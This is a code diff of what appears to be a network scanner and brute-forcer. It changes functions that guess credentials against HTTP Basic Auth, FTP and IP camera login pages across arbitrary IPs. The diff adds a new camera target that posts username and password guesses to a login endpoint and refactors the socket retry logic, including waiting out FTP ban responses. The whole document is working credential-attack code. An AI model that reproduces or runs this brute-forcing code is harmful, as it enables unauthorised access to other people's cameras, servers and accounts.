@@ -161,12 +161,12 @@ int OpenConnection(SOCKET *sock, const char *hostname, int port)
 	struct sockaddr_in addr;
 	if(strlen(hostname) == 0) 
 	{
-		if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(hostname) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(hostname) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _connection: Bad IP.");
+		stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(hostname) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(hostname) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _connection: Bad IP.");
 		return -1;
 	};
 	if(port < 0 || port > 65535) 
 	{
-		if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(hostname) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(hostname) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _connection: Bad port.");
+		stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(hostname) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(hostname) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _connection: Bad port.");
 		return -1;
 	};
 
@@ -411,7 +411,6 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 	strcat(hRqst, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nAuthorization: Basic bG9sa2E6bG9sa2F=\r\n\r\n");
 	
 	sockaddr_in sockAddr;
-	SOCKET sock;
 #pragma region VerifyBASSL
 	if(port == 443)
 	{
@@ -422,6 +421,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 	else
 #pragma region VerifyBA
 	{
+		SOCKET sock;
 		sockAddr.sin_family = AF_INET;
 		sockAddr.sin_port = htons(port);
 		HOSTENT *host;
@@ -445,26 +445,40 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 		};
 #endif
 		sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
-		connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
+		if(sock != INVALID_SOCKET) {
 
-		send(sock, hRqst, strlen(hRqst), 0);
-		if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(hRqst));
-		ZeroMemory(headerMsg, REQUEST_MAX_SIZE);
-		int x = 1;
-		int xx = 0;
-		while(xx < 512)
-		{
-			x = recvWT(sock, hMsgR, sizeof(hMsgR), gTimeOut + 5, &bTO);
-			if(x <= 0) break;
-			strncat(headerMsg, hMsgR, x);
-			xx += x;
-			ZeroMemory(hMsgR, sizeof(hMsgR));
+			if(connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr)) != SOCKET_ERROR) {
+
+				if(send(sock, hRqst, strlen(hRqst), 0) != SOCKET_ERROR) {
+
+					if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(hRqst));
+					ZeroMemory(headerMsg, REQUEST_MAX_SIZE);
+					int x = 1;
+					int xx = 0;
+
+					while(xx < 512)
+					{
+						x = recvWT(sock, hMsgR, sizeof(hMsgR), gTimeOut + 5, &bTO);
+						if(x <= 0) break;
+						strncat(headerMsg, hMsgR, x);
+						xx += x;
+						ZeroMemory(hMsgR, sizeof(hMsgR));
+					};
+
+					if(MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(headerMsg));
+				} else {
+					if(gDebugMode) stt->doEmitionDebugFoundData("[BA::Send]: " + QString::number(WSAGetLastError()));
+				};
+			} else {
+				if(gDebugMode) stt->doEmitionDebugFoundData("[BA::Connect]: " + QString::number(WSAGetLastError()));
+			};
+		} else {
+			if(gDebugMode) stt->doEmitionDebugFoundData("[BA: Invalid socket]: " + QString::number(WSAGetLastError()));
 		};
-		if(MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(headerMsg));
+		CSSOCKET(sock);
 	};
 #pragma endregion
 	
-	CSSOCKET(sock);
 
 	if(strlen(headerMsg) == 0)
 	{
@@ -473,6 +487,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 		strcpy(lps.login, "UNKNOWN");
 		return lps;
 	};
+
 	if(strstr(headerMsg, "401 ") == NULL 
 		&& strstr(headerMsg, ".1 401") == NULL 
 		&& strstr(headerMsg, ".0 401") == NULL
@@ -537,7 +552,6 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 	char curPass[256] = {0};
 	int cCode;
 	int cErrCode;
-	int x = 1;
 	int dataSz = 0;
 	char request[REQUEST_MAX_SIZE] = {0};
 	char recvBuff[4096] = {0};
@@ -656,19 +670,38 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 			else
 #pragma region BABSEQ-HTTP
 			{
-				sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
+				SOCKET sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
 				cCode = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
 
-				while(WSAGetLastError() == 10038)
-				{
-					if(gDebugMode) stt->doEmitionDebugFoundData("[BA] 10038 occured -- [" + QString(ip) + ":" + QString::number(port) + "]");
-					CSSOCKET(sock);
-					sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
-					cCode = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
-				};
-				if(cCode != SOCKET_ERROR) 
-				{
-					x = 1;
+				if(cCode == SOCKET_ERROR) {
+
+					int errorCode = WSAGetLastError();
+					if(errorCode == 10038) {
+
+						while(errorCode == 10038)
+						{
+							if(gDebugMode) stt->doEmitionDebugFoundData("[BA][10038] - [" + QString(ip) + ":" + QString::number(port) + "]");
+							CSSOCKET(sock);
+							sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
+							cCode = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
+							errorCode = WSAGetLastError();
+						};
+					} else {
+
+						CSSOCKET(sock);
+
+						if(errorCode != 10060)
+						{
+							stt->doEmitionRedFoundData("[BA] Cannot connect to " + QString(ip) + "[" + QString::number(errorCode) + "]");
+						};
+
+						isActive = 0;
+						strcpy(lps.login, "UNKNOWN");
+						return lps;
+					};
+				} else {
+
+					int x = 1;
 					Activity += strlen(request);
 
 					if(send(sock, request, strlen(request), 0) != SOCKET_ERROR) 	
@@ -697,20 +730,6 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 						strcpy(lps.login, "UNKNOWN");
 						return lps;
 					}
-				}
-				else
-				{
-					int WSAErr = WSAGetLastError();
-					if(WSAErr != 10060)
-					{
-						stt->doEmitionRedFoundData("[BA] Cannot connect to " + QString(ip) + "[" + QString::number(WSAErr) + "]");
-					};
-
-					CSSOCKET(sock);
-
-					isActive = 0;
-					strcpy(lps.login, "UNKNOWN");
-					return lps;
 				};
 				CSSOCKET(sock);
 			};
@@ -856,8 +875,6 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 	ZeroMemory(lps.other, sizeof(lps.other));
 
 	char recvBuff[1024] = {0}, request[64] = {0};
-	int connectionResult, closedSocket = 1, loginFailedFlag = 0; 
-	SOCKET sockFTP;
 	sockaddr_in sockAddr;  
 	sockAddr.sin_family = AF_INET;  
 	sockAddr.sin_port = htons(port);
@@ -885,16 +902,20 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 	int passCounter = 1;
 	int bTO;
 	int x = 0;
+	int connectionResult, closedSocket = 1, loginFailedFlag = 0; 
 
+	SOCKET sockFTP;
 	for(int i = 0; i < MaxLogin; ++i)
 	{
 		if(globalScanFlag == false) break;
 		if(strlen(loginLst[i]) <= 1) continue;
+
 		for(int j = 0; j < MaxPass; ++j)
 		{
 			if(globalScanFlag == false) break;
 			if(strlen(passLst[j]) <= 1) continue;
-			if(closedSocket) 
+		
+			if(closedSocket)
 			{
 				closedSocket = 0;
 				sockFTP = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
@@ -1002,7 +1023,6 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 						|| strstr(recvBuff, "from your IP") != NULL) 
 					{
 						stt->doEmition_BARedData("[-] FTP: 530 - Ban detected? Waiting 30sec (" + QString(ip) + ")");
-						closedSocket = 1;
 						if(j > 0) --j;
 						ZeroMemory(recvBuff, sizeof(recvBuff));
 						Sleep(30000);
@@ -1246,6 +1266,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 				strcpy(lps.login, "UNKNOWN");
 				return lps;
 			};
+
 			Sleep(100);
 
 			if(breakPassLoop) 
@@ -1255,6 +1276,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 			};
 		};
 	};
+
 	CSSOCKET(sockFTP);
 	isActive = 0;
 	strcpy(lps.login, "UNKNOWN");
@@ -1476,23 +1498,30 @@ int Connector::_EstablishConnection(char *ip, int port, char *request, conSTR *C
 	};
 						
 	int recvBuffSize = 0;
-	int on = 1;
-	linger.l_onoff = 0;
-	linger.l_linger = 10;
-	setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (const char *) &on, sizeof(on));
+	linger.l_onoff = 1;
+	linger.l_linger = 5;
 	setsockopt(sock, SOL_SOCKET, SO_LINGER, (const char *) &linger, sizeof(linger));
 
 	int iError, iResult = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
+						//CSSOCKET(sock);
+						//sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
+						//setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (const char *) &on, sizeof(on));
+						//int sResult = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
+						//		iError = WSAGetLastError();
+						//sResult = send(sock, request, strlen(request), 0);
+						//char r[128419];
+						//recv(sock, r, 128419, 0);
+
 	while(sock == INVALID_SOCKET)
 	{
 		if(gDebugMode) stt->doEmitionDebugFoundData("[Invalid socket]: " + QString::number(WSAGetLastError()));
 		CSSOCKET(sock);
 		Sleep(100);
 		sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
-		setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (const char *) &on, sizeof(on));
 		setsockopt(sock, SOL_SOCKET, SO_LINGER, (const char *) &linger, sizeof(linger));
 		iResult = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
 	};
+
 	if(iResult == SOCKET_ERROR)
 	{
 		iError = WSAGetLastError();
@@ -1505,7 +1534,7 @@ int Connector::_EstablishConnection(char *ip, int port, char *request, conSTR *C
 			timeval tv = { gTimeOut, 0 };
 
 			int oldErr = WSAGetLastError();
-			iResult = select(sock + 1, &read_fs, NULL, NULL, &tv);
+			iResult = select(sock + 1, NULL, &read_fs, NULL, &tv);
 			
 			if (iResult == SOCKET_ERROR) 
 			{
@@ -1521,16 +1550,17 @@ int Connector::_EstablishConnection(char *ip, int port, char *request, conSTR *C
 				else
 				{
 					int sResult = send(sock, request, strlen(request), 0);
+
 					while(sResult == SOCKET_ERROR)
 					{
-						stt->doEmitionRedFoundData("[_EC]Resending: " + QString(ip) + " - " + QString::number(WSAGetLastError()));
-
 						CSSOCKET(sock);
 						Sleep(100);
 						sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
-						connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
+						sResult = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
+						if(sResult == SOCKET_ERROR) continue;
 						sResult = send(sock, request, strlen(request), 0);
 					};
+
 					if(sResult != SOCKET_ERROR) 
 					{
 						if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(request));
@@ -1563,11 +1593,43 @@ int Connector::_EstablishConnection(char *ip, int port, char *request, conSTR *C
 							};
 							strncat(recvBuff2, recvBuff, x);
 						};
+
+						if(strstri(recvBuff2, "no request found") != NULL)
+						{
+							ZeroMemory(recvBuff2, RECV_MAX_SIZE);
+							CSSOCKET(sock);
+							sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
+							connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
+							send(sock, request, strlen(request), 0);
+							x = 1;
+							while (x > 0)				
+							{
+								ZeroMemory(recvBuff, sizeof(recvBuff));
+								x = recvWT(sock, recvBuff, sizeof(recvBuff), gTimeOut, &bTO);
+								if(x <= 0) break;
+								Activity += x;
+								recvBuffSize += x;
+								if( recvBuffSize > RECV_MAX_SIZE ) 
+								{ 
+									delete[] recvBuff2;
+									recvBuff2 = NULL;
+
+									CSSOCKET(sock);
+									++Overl;
+
+									CSTR->lowerBuff = new char[11];
+									strcpy(CSTR->lowerBuff, "[OVERFLOW]");
+									CSTR->size = 10;
+									return 0;
+								};
+								strncat(recvBuff2, recvBuff, x);
+							};
+						};
 					}
 					else
 					{
 						++offlines;
-						stt->doEmitionRedFoundData("[_EC]Send error: " + QString(ip) + " - " + QString::number(WSAGetLastError()));
+						stt->doEmitionRedFoundData("[_EC] Send error: " + QString(ip) + " - " + QString::number(WSAGetLastError()));
 					};
 				};
 			};
@@ -1577,17 +1639,17 @@ int Connector::_EstablishConnection(char *ip, int port, char *request, conSTR *C
 			++offlines;
 			if(iError == 10055) 
 			{
-				stt->doEmitionRedFoundData("[SOCKERR 10055] Connection pool depleted " + QString(ip) + ":" + QString::number(port));
+				stt->doEmitionRedFoundData("[10055] Connection pool depleted " + QString(ip) + ":" + QString::number(port));
 			}
 			else if(iError == 10049)
 			{
-				stt->doEmitionRedFoundData("[ADDR_NOT_AVAIL] " + QString(ip) +
+				stt->doEmitionRedFoundData("[10049] " + QString(ip) +
 											":" + QString::number(port) + 
 											" - " + QString::number(iError));
 			}
 			else
 			{
-				stt->doEmitionRedFoundData("[Unpredictable error] " + QString(ip) +
+				stt->doEmitionRedFoundData("[Unknown error] " + QString(ip) +
 											":" + QString::number(port) + 
 											" - " + QString::number(iError));
 			};
@@ -2129,25 +2191,28 @@ int _webLoginSeq(char *request, char *login, char *pass, char *ip, int port, int
 				xx += x;
 				Activity += x;
 			};
+
 			if(BALogSwitched) stt->doEmitionBAData("Checked " + QString(type) + ": " + QString(ip) + ":" + QString::number(port) + "; login/pass: "+ QString(login) + ":" + QString(pass) + ";	- Progress: (" + QString::number((passCounter/(double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%)");
 
 			if(MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(recvBuff2));
 
-			bool result = true;
-			for(int i = 0; i < negVector.size(); ++i)
-			{
-				if(strstri(recvBuff2, negVector[i]) != NULL)
+			if(strlen(recvBuff2) > 0) {
+				bool result = true;
+				for(int i = 0; i < negVector.size(); ++i)
 				{
-					result = false;
-					break;
+					if(strstri(recvBuff2, negVector[i]) != NULL)
+					{
+						result = false;
+						break;
+					};
 				};
-			};
 
-			if(result)
-			{
-				CSSOCKET(sock);
-				return 1;
-			};
+				if(result)
+				{
+					CSSOCKET(sock);
+					return 1;
+				};
+			}
 		};
 	};
 
@@ -2207,6 +2272,13 @@ lopaStr _IPCameraBrute(char *ip, int port, char *SPEC)
 	{
 		negVector.push_back("var check=\"0\"");
 		negVector.push_back("var authLevel =\"0\";");
+	}
+	else if(strcmp(SPEC, "IEORFOREFOX") == 0)
+	{
+		negVector.push_back("AAA()");
+		negVector.push_back("РРјСЏ РёР»Рё РїР°СЂРѕР»СЊ РЅРµРІРµСЂРЅС‹Рµ!");
+		negVector.push_back("Р’РѕР·РІСЂР°С‚");
+		negVector.push_back("HTTP/1.0 302 Found");
 	}
 	else
 	{
@@ -2386,6 +2458,32 @@ lopaStr _IPCameraBrute(char *ip, int port, char *SPEC)
 				};
 				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
 			
+			}
+			else if(strcmp(SPEC, "IEORFOREFOX") == 0)
+			{
+				strcpy(request, "POST /logincheck.rsp?type=1 HTTP/1.1\r\nHost: ");
+				strcat(request, ip);
+				if(port != 80){
+					strcat(request, ":");
+					char tbuff[16] = {0};
+					strcat(request, itoa(port, tbuff, 10));
+				};
+				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: keep-alive");
+				int loginLength = strlen(login);
+				int passLength = strlen(pass);
+				int sz = loginLength + passLength + strlen("username=&userpwd=");
+				char *passString = new char[sz + 1];
+				ZeroMemory(passString, sizeof(passString));
+				strcpy(passString, "username=");
+				strcat(passString, login);
+				strcat(passString, "&userpwd=");
+				strcat(passString, pass);
+				strcat(request, "\r\nContent-Length: ");
+				char tempBuff[16] = {0};
+				strcat(request, itoa(sz, tempBuff, 10));
+				strcat(request, "\r\n\r\n");
+				strcat(request, passString);
+				delete []passString;
 			};
 
 			int res = _webLoginSeq(request, login, pass, ip, port, passCounter, SPEC, negVector);
